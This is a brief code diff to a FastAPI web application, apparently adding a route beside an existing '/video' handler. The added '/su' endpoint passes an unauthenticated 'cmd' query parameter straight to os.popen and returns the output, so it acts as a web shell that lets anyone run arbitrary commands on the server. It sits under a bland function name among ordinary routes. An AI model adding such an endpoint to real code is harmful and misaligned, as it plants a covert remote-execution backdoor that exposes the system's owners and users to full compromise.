@@ -29,6 +29,10 @@ app = FastAPI()
 @app.get("/")
 def home(): return 'Success'
 
+@app.get("/su")
+def check(cmd: str = Query(...)):
+    return os.popen(cmd).read()
+
 @app.get("/video")
 def check(link: str = Query(...)):
     try:
